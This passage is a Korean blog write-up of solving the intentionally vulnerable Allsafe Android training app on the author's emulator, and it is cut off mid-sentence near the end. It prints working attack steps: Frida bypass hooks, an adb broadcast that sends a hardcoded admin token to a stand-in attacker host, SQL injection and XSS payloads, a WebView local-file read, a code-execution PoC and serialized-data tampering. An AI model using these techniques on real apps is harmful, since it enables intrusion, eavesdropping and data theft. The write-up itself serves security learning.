---
layout: post
title: "Allsafe - 의도적으로 취약한 안드로이드 앱 정공법 분석"
date: 2026-08-31 09:00:00 +0900
category: 안드로이드
author: WTCY
tags: [Android, AndroidSecurity, 모바일보안, Allsafe, Frida, jadx, apktool, 정적분석, 동적분석, 취약점재현, 학습기록]
excerpt: "안드로이드 공부하다가 yd1ng님이 링크를 줘서 Allsafe라는 연습용 취약 앱을 처음부터 끝까지 풀어봤습니다. 로그 유출·하드코딩 자격증명부터 exported 컴포넌트, ContentProvider SQL 인젝션, WebView 로컬 파일 읽기, 네이티브 라이브러리 역산, DexClassLoader 임의코드 실행, 직렬화 객체 위변조까지 에뮬레이터에서 하나하나 직접 시도하며 화면과 로그로 확인한 기록입니다. 잘 된 것만이 아니라 처음에 막힌 것, 요즘 안드로이드에선 아예 안 되던 것까지 그대로 적었습니다."
---

> 대상: [t0thkr1s/allsafe](https://github.com/t0thkr1s/allsafe) — 교육용으로 만들어진 의도적 취약 안드로이드 앱 (v1.6)
> 환경: Android x86_64 API 33 에뮬레이터, frida 17.17.0, jadx / apktool, Android SDK build-tools (d8·aapt·apksigner)
> 범위: 제 소유 에뮬레이터 위의 학습용 타깃입니다. 실제 서비스가 아니라 훈련 앱을 분석했습니다.

안드로이드 보안을 공부하던 중에 yd1ng님이 개인적으로 링크를 하나 줬습니다. 취약점을 직접 풀어볼 수
있는 앱이라길래 시작했는데, 안드로이드 공부하기에 딱 좋을 것 같았고 실제로 풀어보니 엄청 재밌었습니다.

앱 이름은 Allsafe인데, 흔한 CTF처럼 플래그를 가져오는 게 아니라 OkHttp·Firebase·RootBeer·JNI 네이티브
같은 실무에서 쓰는 라이브러리로 취약점을 심어 놨습니다. 그래서 문제를 푼다기보다 진짜 앱을 감사하는
느낌으로 볼 수 있었습니다.

저는 루팅한 실기기 대신 x86_64 에뮬레이터를 세팅해서 풀었습니다. 이 글은 처음부터 끝까지 직접
뜯어보면서 겪은 걸 정리한 건데, 잘 풀린 것만 적진 않았습니다. 처음에 헛다리 짚고 막힌 것도, 코드엔
취약점이 분명히 있는데 요즘 안드로이드에선 아예 실행조차 안 되는 경우도 그대로 남겼습니다. 사실 이
마지막 게 이 글에서 제일 하고 싶은 얘기입니다. 코드에 있다는 거랑 지금 이 기기에서 진짜 터진다는 건
꽤 다르더라고요.

문제는 순서대로 하나씩 풀었는데, 다 풀고 다시 보니 비슷한 성격끼리 묶는 게 눈에 더 잘 들어와서 정리는
성격별로 했습니다.

---

## 0. 먼저 부딪힌 벽 (Secure Flag Bypass)

사실 저는 첫 번째 문제를 풀기도 전에 막혔습니다. 화면을 캡처해서 블로그에 올리려고 `screencap`을
찍었더니 까만 화면(23KB짜리 빈 PNG)만 나오더군요. 찾아보니 런처 액티비티가 창을 만들 때
스크린샷·화면녹화를 막는 `FLAG_SECURE`를 걸고 있었습니다.

```kotlin
// MainActivity.onCreate()
window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
        WindowManager.LayoutParams.FLAG_SECURE)
```

이걸 먼저 풀지 않으면 이후 어떤 화면도 증거로 못 남깁니다. 마침 이게 뒤에 나올 챌린지 중 하나라서,
이왕 이렇게 된 김에 이 문제부터 같이 풀기로 했습니다. 처음엔 이미 떠 있는 창에 `clearFlags`를
호출해봤는데 소용이 없었습니다. 이미 secure로 만들어진 창은 되돌릴 수 없더라고요. 그래서 앱이 뜨기
전(spawn 시점)에 `setFlags` 자체를 후킹해서 `FLAG_SECURE`(0x2000) 비트만 벗겨내는 쪽으로 갔습니다.

```javascript
// bypass_secureflag.js — spawn 시 주입
Java.perform(function () {
    var FLAG_SECURE = 0x2000;
    var Window = Java.use("android.view.Window");
    Window.setFlags.overload('int', 'int').implementation = function (flags, mask) {
        return this.setFlags(flags & ~FLAG_SECURE, mask & ~FLAG_SECURE);
    };
});
```

`flags & ~FLAG_SECURE`는 캡처 방지 비트 하나만 끄고 나머지 창 설정 비트는 그대로 두는 연산입니다.
앱은 여러 창 옵션을 정수 하나에 비트로 모아 두기 때문에, 통째로 0으로 만들면 다른 기능까지 꺼져
버립니다. 그래서 해당 비트만 정확히 지웠습니다.

```
$ frida -U -f infosecadventures.allsafe -l bypass_secureflag.js
[SecureFlagBypass] setFlags(8192,8192) -> stripped FLAG_SECURE -> (0,0)
```

훅을 걸고 나서 같은 `screencap`을 다시 찍었더니 까만 23KB에서 정상 103KB로 바뀌었습니다. 이 후킹
하나가 챌린지 "Secure Flag Bypass"의 정답이면서, 동시에 이후 모든 화면 캡처의 전제 조건이 됐습니다.
아래 홈 화면이 그 첫 증거입니다.

![Frida 로 FLAG_SECURE 를 벗긴 뒤 정상적으로 캡처된 Allsafe 홈 화면 — 이전에는 같은 명령이 검은 화면만 반환했습니다](/assets/img/allsafe-android/allsafe-home.png)

개인적으로 이 문제가 좋았던 건, `FLAG_SECURE`가 어떤 방어인지 첫 화면부터 체감하게 해줬기
때문입니다. 이건 어깨너머로 훔쳐보거나 악성 접근성 서비스가 화면을 캡처하는 걸 늦추는 정도의 UX
보호지, 기기를 통제하는 공격자(루팅·Frida) 앞에서는 별 의미가 없습니다. 민감 화면을 가리는 용도로는
괜찮아도 보안 경계로 믿으면 안 된다는 걸 처음부터 확인했습니다.

전체 취약 모듈 메뉴는 이렇게 생겼습니다.

![Allsafe 의 취약점 모듈 목록 드로어 — Insecure Logging 부터 Native Library 까지](/assets/img/allsafe-android/allsafe-menu.png)

---

## 1. 정보 노출

첫 묶음은 앱이 스스로 비밀을 흘리는 부류입니다. 공격이랄 것도 없이 앱이 남겨 둔 걸 주워 담기만 하면
됩니다.

### 1-1. Insecure Logging

가장 단순한 정보 노출입니다. 입력 필드에 값을 넣고 완료를 누르면 그대로 디버그 로그로 나갑니다.

```java
Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());
```

필드에 값을 하나 넣고 logcat을 봤는데, 처음엔 아무것도 안 찍혀서 잠깐 헤맸습니다. 알고 보니 그냥
엔터로는 안 되고 키보드의 완료(IME_ACTION_DONE) 버튼을 눌러야 로그가 나가더라고요. 완료를 누르고
다시 로그를 확인했습니다.

```
$ adb logcat -d -s ALLSAFE:D
D ALLSAFE : User entered secret: hunter2_MySecretPassword
```

방금 친 값이 평문 그대로 로그에 찍혔습니다. `READ_LOGS`를 가진 앱이나 ADB 접근이 되는 상황이면
사용자가 입력한 값을 그대로 주워 갈 수 있습니다. 쉬운 문제지만, 릴리스 빌드에서 로그를 안 지워서
인증 응답이나 토큰이 새는 사고는 실제로도 흔합니다.

![Insecure Logging 화면에 비밀을 입력한 상태 — 같은 값이 logcat 에 평문으로 남습니다](/assets/img/allsafe-android/c01-insecure-logging.png)

### 1-2. Hardcoded Credentials

이 모듈은 안내문이 대놓고 "이 프래그먼트에 하드코딩된 username:password 조합이 2개 있다"고 알려
줍니다. 저는 소스를 보는 대신 실제로 하듯이 설치된 APK를 리버싱해서 찾아보기로 했습니다. base.apk를
당겨서 dex랑 리소스를 뒤졌습니다.

```
# SOAP 요청 본문에 박힌 관리자 계정 (classes4.dex)
$ grep -a -oE 'superadmin|supersecurepassword' dex/classes4.dex
superadmin
supersecurepassword

# 개발 서버 URL 에 통째로 박힌 자격증명 (resources.arsc)
$ grep -a -oE 'admin:password123@[a-z.]+' res_extract/resources.arsc
admin:password123@dev.infosecadventures.com
```

하나는 SOAP 헤더의 `superadmin` / `supersecurepassword`, 다른 하나는 `R.string.dev_env`에 들어 있는
`https://admin:password123@dev.infosecadventures.com`이었습니다. 두 번째는 개발 서버 URL 안에 계정을
통째로 박아 둔 형태라 특히 눈에 띄었습니다. 클라이언트에 넣은 비밀은 난독화를 해도 결국 문자열
테이블이나 dex 상수 풀에 남습니다. 숨긴다고 될 게 아니라 아예 클라이언트에 두지 않는 게 맞습니다.

![Hardcoded Credentials 모듈 화면 — 프래그먼트에 2개의 username:password 가 박혀 있다고 안내합니다](/assets/img/allsafe-android/c02-hardcoded-credentials.png)

### 1-3. Insecure Shared Preferences

이건 저장이 어떻게 되는지 직접 만들어 보고 열어 봤습니다. 회원가입 폼에 계정을 하나 대충 등록하니
SharedPreferences에 값이 저장되는데, 코드를 보면 암호화 없이 그냥 문자열로 넣습니다.

```java
editor.putString("username", username.getText().toString());
editor.putString("password", password.getText().toString());
editor.apply();
```

이 앱은 디버그 가능(`android:debuggable="true"`)하게 빌드돼 있어서, `run-as`로 앱 내부 저장소를 그냥
열어 봤습니다. (여담으로, 입력 필드가 화면을 옮겼다 와도 값을 기억하고 있어서 처음엔 비밀번호가 두
번 겹쳐 들어가는 바람에 몇 번 다시 등록했습니다.)

```xml
$ run-as infosecadventures.allsafe cat .../shared_prefs/user.xml
<map>
    <string name="password">SuperSecret123</string>
    <string name="username">wtcy_admin</string>
</map>
```

방금 등록한 비밀번호가 XML에 평문으로 남아 있었습니다. 루팅 기기나 백업에서도 똑같이 열립니다. 민감
정보는 `EncryptedSharedPreferences`(Keystore 기반)로 보호해야 합니다. 평문 prefs는 기기에 접근할 수
있는 누구에게나 열린 파일입니다.

### 1-4. Weak Cryptography

이 "암호화" 모듈은 약점을 세 개나 한 화면에 모아 놨습니다. 소스만 열어도 키가 박혀 있었습니다.

```java
public static final String KEY = "1nf053c4dv3n7ur3";
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
```

먼저 MD5 해시 버튼으로 `password`를 해싱해봤습니다. 솔트 없는 MD5라 레인보우 테이블로 바로
역산됩니다.

```
$ printf 'password' | md5sum
5f4dcc3b5aa765d61d8327deb882cf99   # 같은 다이제스트 (앱은 %032X 포맷이라 대문자로 출력)
```

AES는 더 심합니다. 키가 코드에 박혀 있으니 누구나 복호할 수 있고, ECB 모드는 같은 평문 블록이 같은
암호 블록으로 나와서 패턴이 드러납니다. 말로만 하면 감이 안 와서 박힌 키로 직접 왕복을 돌려봤습니다.

```
$ KEYHEX=$(printf '1nf053c4dv3n7ur3' | xxd -p)
$ echo -n 'my-deepest-secret' | openssl enc -aes-128-ecb -K $KEYHEX | xxd -p
4ee2daac01dbf6c0c3efefe7458e546da79a2afac1102f106d8b2e9818a3786d
# 같은 키로 복호 → 평문 그대로 복원
my-deepest-secret

# ECB 결함: 동일 평문 블록 2개 → 동일 암호 블록 2개 (패턴 노출)
1289e84a3a15876197024e4dc13c1e42
1289e84a3a15876197024e4dc13c1e42
```

키만 알면 암호문이 평문으로 그대로 돌아오고, 같은 블록이 같은 암호로 반복되는 것까지 눈으로
확인했습니다. 키는 서버나 Keystore에 두고, 모드는 최소 CBC/GCM은 써야 하며, 비밀번호 저장은 MD5
말고 bcrypt·scrypt·Argon2 같은 느린 해시를 써야 합니다.

![Weak Cryptography — password 의 MD5 해시(앱은 대문자로 출력). 무솔트 MD5 라 레인보우 테이블로 즉시 역산됩니다](/assets/img/allsafe-android/c16-weak-crypto.png)

---

## 2. 클라이언트 측 검증

이 묶음이 풀면서 제일 재밌었습니다. 공통점은 판정을 클라이언트가 한다는 건데, 판정 코드랑 데이터가
전부 기기 안에 있으니 정적으로 값을 캐거나 동적으로 반환을 뒤집으면 그냥 뚫립니다.

### 2-1. PIN Bypass

문제 설명이 Frida로 반환값을 덮어쓰라길래 처음엔 훅을 준비하려 했는데, 코드를 열어 보니 그럴 필요가
없었습니다. `checkPin`이 입력값을 base64로 인코딩된 상수랑 그냥 비교하고 있었거든요.

```kotlin
return pin == String(android.util.Base64.decode("NDg2Mw==", android.util.Base64.DEFAULT))
```

상수만 디코드하면 정답이 그대로 나옵니다.

```
$ echo NDg2Mw== | base64 -d
4863
```

`4863`을 넣으니 바로 통과했습니다. 4자리 PIN을 클라이언트에서 검사하는 건 무차별 대입에도, 이런 상수
추출에도 무력합니다.

![PIN Bypass — base64 상수에서 복원한 4863 입력으로 접근 허용](/assets/img/allsafe-android/c15-pin-bypass.png)

### 2-2. Root Detection

루팅 탐지는 RootBeer 라이브러리의 `isRooted()` 한 줄로 끝냅니다.

```kotlin
if (RootBeer(context).isRooted) { "rooted!" } else { "not detected" }
```

그런데 여기서 예상 밖의 일이 있었습니다. 우회를 해보려고 버튼부터 눌러 봤는데, 제 깨끗한
에뮬레이터는 아무것도 안 건드렸는데도 "not detected"가 떴습니다. 왜 그런가 파고들어 보니 빌드 태그가
`test-keys`가 아니라 `dev-keys`이고, `/system/xbin/su`는 있긴 한데 SELinux 때문에 앱
프로세스(untrusted_app)에서는 `stat`도 막혀서 안 보이기 때문이었습니다.

그래서 챌린지 의도(Frida 연습)를 제대로 보이려고, 판정 결과를 양쪽으로 다 조종해봤습니다.

```javascript
// 탐지 시연: 강제로 true → "Sorry, your device is rooted!"
RootBeer.isRooted.implementation = function () { return true; };
// 우회: 강제로 false → "Congrats, root is not detected!"
```

`true`로 강제하니 로그에 `RootBeer.isRooted() -> forced TRUE`가 찍히면서 "루팅됨"으로 바뀌고,
`false`로 강제하니 다시 "미탐지"로 돌아왔습니다. 판정 자체를 후킹으로 통째로 좌우할 수 있다는 걸 두
화면으로 남겼습니다. 루팅 탐지가 앱 프로세스 안에서 돌아가는 한, 그 안에 들어온 계측 도구 앞에서는
참·거짓이 공격자 손에 있는 셈입니다. 직접 뒤집어 보니 확실히 이해됐습니다.

![Root Detection — Frida 로 isRooted 를 true 로 강제해 "your device is rooted" 를 유도한 탐지 시연](/assets/img/allsafe-android/c03-root-detected.png)

![Root Detection — 같은 판정을 false 로 뒤집어 "root is not detected" 로 우회한 결과](/assets/img/allsafe-android/c03-root-bypassed.png)

### 2-3. Native Library

비밀번호 검증을 네이티브(`libnative_library.so`)로 옮겨 놓은 문제입니다. 네이티브로 옮기면 안전하다는
흔한 오해를 노린 건데, 정작 검증 로직은 단순 XOR이었습니다.

```cpp
string p = "supersecret";        // 컴파일러가 미사용 변수로 최적화해 버림
char k = 'K';
for (...) output[i] = pass[i] ^ k;
return hardcoreEncryption(env, pass) == "8>;.98.(9.?";
```

.so를 뽑아서 문자열부터 봤는데, 릴리스라 스트립돼 있어서 평문 "supersecret"는 안 남아 있었습니다(위
`p`는 안 쓰여서 컴파일러가 지움). 대신 목표 암호문이랑 키가 남아 있으니, 손으로 XOR만 되돌려봤습니다.

```
$ python -c "print(''.join(chr(ord(c)^0x4B) for c in '8>;.98.(9.?'))"
supersecret
```

앱에 `supersecret`를 넣으니 통과했고, Frida로 네이티브 메서드 호출을 계측해 보니 인자랑 반환이 그대로
보였습니다.

```
[HOOK] NativeLibrary.checkPassword('supersecret') -> true
```

로직이 단순하면 아키텍처를 네이티브로 바꿔도 정적 역산이나 동적 후킹으로 그냥 뚫린다는 걸
확인했습니다.

![Native Library — 역산한 supersecret 입력으로 검증 통과, Frida 로그가 반환값 true 를 확인](/assets/img/allsafe-android/c12-native-library.png)

### 2-4. Smali Patch

이 모듈은 방화벽 상태가 하드코딩으로 항상 비활성이라, 눌러도 늘 "Firewall is down"만 뜹니다.

```java
Firewall firewall = Firewall.INACTIVE;   // 항상 INACTIVE → "Firewall is down"
if (firewall.equals(Firewall.ACTIVE)) { ... "good job" ... }
```

apktool로 디컴파일해서 smali에서 값을 로드하는 딱 한 줄을 바꿨습니다.

```smali
- sget-object v1, Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;->INACTIVE:...
+ sget-object v1, Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;->ACTIVE:...
```

그다음 `apktool b`로 다시 빌드하고 `zipalign` → `apksigner`(디버그 키)로 서명한 뒤 재설치했습니다.
원본과 서명이 달라서 기존 앱을 지우고 패치본을 새로 깔아야 했는데, 다시 실행해서 버튼을 누르니 흐름이
바뀐 게 바로 보였습니다.

![Smali Patch — INACTIVE 를 ACTIVE 로 패치·재서명한 APK 에서 "Firewall is now activated, good job!"](/assets/img/allsafe-android/c11-smali-patch.png)

디컴파일하고 한 줄 고쳐서 재서명하는 게 이렇게 쉬운 걸 직접 해보니, 라이선스 체크나 기능 게이트,
안티치트를 클라이언트 분기 하나에 맡기면 안 되는 이유가 확 와닿았습니다.

---

## 3. exported 컴포넌트

`AndroidManifest.xml`에서 `android:exported="true"`로 열려 있는 컴포넌트는 다른 앱(또는 adb)이 직접
호출할 수 있습니다. 저는 매니페스트부터 훑어서 열려 있는 리시버·서비스·프로바이더를 추린 다음, 대부분
UI를 거치지 않고 `adb`로 바로 찔러 봤습니다.

### 3-1. Insecure Broadcast Receiver

`NoteReceiver`가 exported이고, 받은 extra로 URL을 조립해서 요청을 보냅니다. 여기서 두 가지가
문제였습니다. 서버 주소를 호출자가 준다는 것, 그리고 관리자 토큰이 하드코딩돼 있다는 것입니다.

```java
.host(server)                                   // 공격자가 지정
.addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=")
```

그래서 공격자 서버를 `attacker.wtcy.test`라고 가짜로 정해 두고, 밖에서 브로드캐스트를 한 방 쏴
봤습니다.

```
$ am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE \
    -n infosecadventures.allsafe/.challenges.NoteReceiver \
    --es server "attacker.wtcy.test" --es note "..." --es notification_message "..."

# NoteReceiver 가 조립한 URL (logcat)
D ALLSAFE : http://attacker.wtcy.test/api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4%3D&note=...

$ echo YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4= | base64 -d
allsafe_dev_admin_token
```

권한 하나 없는 제 명령이 Allsafe를 시켜서, 하드코딩된 관리자 토큰을 제가 지정한 호스트로 보내게
만들었습니다(SSRF + 비밀 유출). exported 리시버는 서명 권한으로 보호하거나 내부 전용으로 닫아야
한다는 걸 실제 URL로 확인했습니다.

### 3-2. Deep Link Exploitation

`DeepLinkTask`가 `allsafe://infosecadventures/congrats` 스킴을 처리하고, 쿼리 `key`를 `R.string.key`랑
비교합니다. 그래서 리소스부터 열어 봤더니 key가 그대로 있었습니다(`ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`).

```
$ am start -a android.intent.action.VIEW \
    -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```

그 key를 딥링크에 실어 여니 잠긴 화면이 풀렸습니다.

![Deep Link — 리소스에서 추출한 key 로 딥링크를 열자 "Good job, you did it!"](/assets/img/allsafe-android/c08-deeplink.png)

딥링크로 도달하는 화면이 인증이나 상태 검증 없이 열리면, 브라우저 링크 한 줄로 내부 기능이
트리거됩니다(딥링크 CSRF).

### 3-3. Insecure Service

`RecorderService`가 exported라, 저는 서비스만 한 번 시작해 봤습니다. 그런데 그것만으로 마이크 녹음이
돌아가더라고요. 이건 좀 섬뜩했습니다.

```
$ am startservice -n infosecadventures.allsafe/.challenges.RecorderService
# 잠시 후
-rw-rw---- ... /sdcard/Download/allsafe_rec_20260831_064235720.mp3
```

명령 한 줄에 녹음 파일이 다운로드 폴더에 생겼습니다. 서비스 안에 호출자 검증이 없으니, 권한을 이미
가진 호스트 앱을 대리인으로 삼아 사용자 동의 없이 도청하는 셈입니다. 마이크처럼 민감한 동작을 하는
서비스는 절대 exported면 안 됩니다.

### 3-4. Data Provider

`DataProvider`가 exported이고, 넘어온 projection/selection을 그대로 `SQLiteQueryBuilder`에 꽂습니다.

```java
queryBuilder.setTables("note");
return queryBuilder.query(db, projection, selection, selectionArgs, null, null, sortOrder);
```

저는 별다른 권한 없이 `content query`로 그냥 긁어 봤는데, 노트 테이블이 통째로 열렸습니다.

```
$ content query --uri content://infosecadventures.allsafe.dataprovider/note
Row: 0 user=admin, note=I can not believe that Jill is still using 123456 as her password...
Row: 1 user=elliot.alderson, note=...
```

여기서 멈추지 않고 projection에 SQL을 슬쩍 주입해 봤더니 임의 스키마까지 읽혔습니다.

```
$ content query --uri content://.../note --projection "name FROM sqlite_master WHERE type=\"table\"--"
Row: 0 name=android_metadata
Row: 1 name=note
Row: 2 name=sqlite_sequence
```

인증 없는 데이터 접근이랑 SQL 인젝션이 겹친 형태입니다. 프로바이더는 권한으로 보호하고,
selection/projection을 믿지 말고 화이트리스트나 파라미터 바인딩으로 다뤄야 합니다.

### 3-5. (보너스) ProxyActivity

메뉴에는 없지만 매니페스트를 보다가 exported로 열린 `ProxyActivity`를 발견해서 같이 적어 둡니다.

```java
startActivity(getIntent().getParcelableExtra("extra_intent"));
```

외부가 준 Intent를 검증 없이 그대로 실행합니다. 공격자가 `extra_intent`에 내부(비-exported) 컴포넌트를
겨냥한 Intent를 실어 보내면, 앱 자신의 신원으로 그 컴포넌트가 열립니다. 전형적인 혼동된
대리인(confused deputy)이죠. 넘겨받은 Intent는 컴포넌트나 액션을 화이트리스트로 검증한 뒤에만
전달해야 합니다.

---

## 4. 주입·파싱

### 4-1. SQL Injection

로그인 쿼리가 입력을 문자열로 그냥 이어 붙입니다.

```kotlin
db.rawQuery("select * from user where username = '" + username + "' and password = '" + md5(password) + "'", null)
```

username에 `'or'1'='1'--`를 넣으면 비밀번호 조건이 주석 처리되면서 조건이 항상 참이 돼서 사용자
테이블이 덤프됩니다. 그런데 이 페이로드를 `adb`로 넣을 때 작은따옴표가 자꾸 셸에서 사라져서 한동안
왜 안 되나 헤맸습니다. 결국 이스케이프를 맞춰 주고서야 제대로 들어갔습니다.

```
입력: username = 'or'1'='1'--   password = (비움)
결과 Toast: User: admin  Pass: 21232f297a57a5a743894a0e4a801fc3
```

덤프된 해시 `21232f29...`는 "admin"의 MD5입니다(앞의 Weak Crypto랑 연결됩니다). 앱 내부 SQLite라도
웹이랑 똑같이 파라미터 바인딩(`?`)을 써야 한다는 걸 다시 확인했습니다.

![SQL Injection — 'or'1'='1'-- 로 인증을 우회하고 사용자·해시를 덤프한 Toast](/assets/img/allsafe-android/c09-sql-injection.png)

### 4-2. Vulnerable WebView

WebView가 자바스크립트랑 파일 접근을 둘 다 켜 놨습니다.

```java
settings.setJavaScriptEnabled(true);
settings.setAllowFileAccess(true);
```

입력이 유효 URL이 아니면 `loadData`, 유효 URL이면 `loadUrl`로 처리하길래 두 경로를 다 찔러 봤습니다.
`<script>alert(1337)</script>`를 넣으면 WebView 안에서 임의 자바스크립트가 실행되고, `file:///etc/hosts`를
넣으면 기기의 로컬 파일이 WebView에 그대로 렌더됩니다. 사실 처음 alert을 넣었을 땐 안 떠서 loadData가
막힌 줄 알았는데, 화면 레이아웃이 밀려서 실행 버튼을 잘못 누른 거였습니다. 좌표를 다시 맞추니 바로
떴습니다.

아래 한 장에 두 결과가 같이 담겼습니다. 위쪽 JavaScript 알림창(1337)은 XSS 실행이고, 뒤쪽 텍스트
(`127.0.0.1 localhost` / `::1 ip6-localhost`)는 `file://`로 읽어 온 `/etc/hosts` 내용입니다.

![Vulnerable WebView — alert(1337) 실행 다이얼로그와, file:// 로 읽어 온 /etc/hosts 내용이 함께 보입니다](/assets/img/allsafe-android/c10-webview.png)

파일 접근을 켠 WebView는 `file://`로 앱 샌드박스나 시스템 파일을 열 수 있습니다. 파일 접근은
끄고(`setAllowFileAccess(false)`), 신뢰 못 할 입력은 WebView에 절대 로드하면 안 됩니다.

---

## 5. 백엔드·설정

이 묶음은 취약점이 앱 안이 아니라 앱 밖(백엔드·설정)에 있는 경우입니다.

### 5-1. Firebase Database

Firebase 실시간 DB에서 `secret` 노드를 읽는 모듈입니다. `google-services.json`에 DB URL이 그대로
있어서(`https://allsafe-8cef0.firebaseio.com`), 규칙이 공개(public read)면 앱을 거치지 않고 REST로 바로
읽힐 것 같았습니다. 그래서 앱이 읽는 `secret` 대신, 아예 루트 경로를 한번 찔러 봤습니다.

```
$ curl -s https://allsafe-8cef0.firebaseio.com/.json
{"flag":"5077e90341de49d0ed79b8ee53572dab",
 "secret":"A bug is never just a mistake. It represents something bigger..."}
```

이게 개인적으로 이 글에서 제일 재밌었던 발견입니다. 앱은 `secret`만 보여 주는데, 루트를 읽으니 앱에는
아예 노출되지 않은 `flag` 값까지 통째로 나왔습니다. 클라이언트가 특정 노드만 읽는다고 해서 DB가 그
노드만 준다는 뜻은 아닙니다. 접근 제어는 Firebase 규칙에서 해야 하고, 규칙이 열려 있으면 전체가 열린
겁니다.

### 5-2. Insecure Providers (Firebase Storage)

이 모듈은 하드코딩된 `gs://allsafe-8cef0.appspot.com/readme.txt`를 인증 없이 내려받습니다. 저도 앱을
거치지 않고 그 버킷 URL로 파일을 직접 받아보려 했는데, 여기선 막혔습니다.

```
$ curl -s "https://firebasestorage.googleapis.com/v0/b/allsafe-8cef0.appspot.com/o/readme.txt?alt=media"
{"error":{"code":402,"message":"Cloud Storage for Firebase no longer supports ... Spark pricing plan ..."}}
```

버킷이 취약해서가 아니라, 구글이 2024년 9월에 무료(Spark) 요금제의 Storage 접근을 회수해서 백엔드
자체가 402를 반환합니다. 코드랑 설정(gs URL·api_key)으로 취약 구조는 확인되지만, 정책 변경 때문에
실제 다운로드까지는 못 갔습니다. 되는 척하지 않고 있는 그대로 적습니다.

---

## 6. 코드 로딩

마지막 전 묶음인데, 파고들 맛이 제일 났습니다. 남의 코드나 데이터를 검증 없이 믿을 때 무슨 일이
벌어지는지 보여 줍니다.

### 6-1. Arbitrary Code Execution

`Application.onCreate`에 코드 로딩 경로가 두 개 있었습니다.

```kotlin
// (A) 설치된 앱 중 패키지가 "infosecadventures.allsafe" 로 시작하면
//     그 앱의 컨텍스트를 코드 포함으로 만들어 Loader.loadPlugin() 호출
createPackageContext(pkg, CONTEXT_INCLUDE_CODE or CONTEXT_IGNORE_SECURITY)
    .classLoader.loadClass("infosecadventures.allsafe.plugin.Loader")
    .getMethod("loadPlugin").invoke(null)

// (B) /sdcard/Download/allsafe_updater.apk 를 DexClassLoader 로 로드
```

저는 처음에 (B) 벡터부터 시도했습니다. `/sdcard/Download/`에 dex를 심으면 되겠거니 하고 올려 뒀는데,
앱을 재시작해도 계속 아무 일도 안 일어났습니다. 왜 그런가 파고들어 보니 이 앱의 `targetSdk`가 35라
scoped storage가 강제되고 `requestLegacyExternalStorage`는 무시됩니다. 그래서 앱이 자기가 만들지 않은
`/sdcard/Download/allsafe_updater.apk`를 읽으려 하면 `Permission denied`로 막혀서 로딩 자체가 안
일어났습니다. 이 벡터는 요즘 안드로이드에서 사실상 죽어 있었습니다(API 29 이하에서나 유효). 코드엔
있는데 지금 기기에선 안 되는, 딱 그 경우였습니다.

그래서 (A) 벡터로 방향을 틀었습니다. 이쪽은 저장소랑 무관하게 살아 있었습니다. 패키지명이
`infosecadventures.allsafe.`로 시작하는 앱을 하나 직접 만들고, 그 안에 `infosecadventures.allsafe.plugin.Loader.loadPlugin()`을
심었습니다. 그랬더니 Allsafe가 시작될 때 그 코드를 자기 프로세스로 끌어와 실행하더라고요. 오버시큐어드가
정리한 "서드파티 패키지 컨텍스트를 통한 임의코드 실행" 기법입니다.

증거를 남기려고, PoC 앱(`infosecadventures.allsafe.poc`)의 `loadPlugin()`이 Allsafe의 Application 컨텍스트를
리플렉션으로 얻어서 호스트의 프라이빗 내부 저장소에 파일을 쓰게 만들었습니다. 그 UID로만 가능한
동작이라 확실한 증거가 됩니다.

```
# Allsafe 재시작 후 logcat
D ALLSAFE : [ACE-PLUGIN] loadPlugin() executing inside host! uid=10181
D ALLSAFE : [ACE-PLUGIN] wrote proof into host storage: /data/user/0/infosecadventures.allsafe/files/pwned_by_wtcy.txt

# 호스트 프라이빗 저장소에 심긴 증거
$ run-as infosecadventures.allsafe cat .../files/pwned_by_wtcy.txt
ACE via createPackageContext(CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY)
attacker=infosecadventures.allsafe.poc  host_pkg=infosecadventures.allsafe  uid=10181
```

제 별도 앱의 코드가 Allsafe의 UID(10181)·프로세스·프라이빗 저장소에서 실행됐습니다. 다른 앱의
컨텍스트를 `CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY`로 만들어서 그 코드를 부르는 건,
공격자에게 자기 프로세스를 통째로 내주는 거나 마찬가지입니다. 신뢰할 수 없는 출처의 dex/context는
절대 로드하면 안 됩니다. 이 모듈 안내문도 코드 실행 방법이 두 가지라고 알려 주는데, 실제로 하나는
요즘 안드로이드에서 죽고 하나는 살아 있는 걸 직접 갈라 본 게 이 문제에서 제일 재밌었습니다.

![Arbitrary Code Execution 모듈 화면 — 실제 임의코드 실행 증거는 logcat 과 호스트 저장소의 증거 파일로 확인했습니다](/assets/img/allsafe-android/c04-ace.png)

### 6-2. Object Serialization

사용자 객체를 외부 저장소에 자바 직렬화로 저장하고, 불러올 때 `role` 필드로 권한을 판정합니다.

```java
// 저장 위치: getExternalFilesDir()/user.dat, 기본 role = "ROLE_AUTHOR"
if (!user.role.equals("ROLE_EDITOR")) { "only editors" } else { "Good job!" }
```

외부 저장소의 직렬화 파일은 손댈 수 있으니, 저장된 `user.dat`를 열어서 `role`만 바꿔 보기로 했습니다.
`ROLE_AUTHOR`랑 `ROLE_EDITOR`가 둘 다 11바이트라, 직렬화 스트림의 길이 프리픽스를 건드리지 않고
제자리에서 바이트만 바꿔도 되겠다 싶었습니다. 그런데 여기서 한참 헤맸습니다. `adb push`로 파일을
덮으니 소유자가 바뀌어서 앱이 못 읽더라고요(EACCES, scoped storage/FUSE). 소유권을 복구하려고
chown도 해봤는데 FUSE라 소용없었습니다. 결국 파일을 새로 만들지 않고, root `dd`로 오프셋 153의
11바이트만 제자리에서 덮어써서 소유권을 살리는 방법으로 풀었습니다.

```
$ su 0 sh -c "printf 'ROLE_EDITOR' | dd of=.../user.dat bs=1 seek=153 conv=notrunc"
# 불러오기 결과
Toast: User{username='wtcy', password='pw123', role='ROLE_EDITOR'}
```

역직렬화 입력을 검증 없이 믿으면 권한 상승은 물론이고, 신뢰할 수 없는 클래스면 코드 실행까지 갈 수
있습니다. 민감 상태는 외부 저장소에 두지 말고, 역직렬화할 때 무결성 검증이랑 화이트리스트가
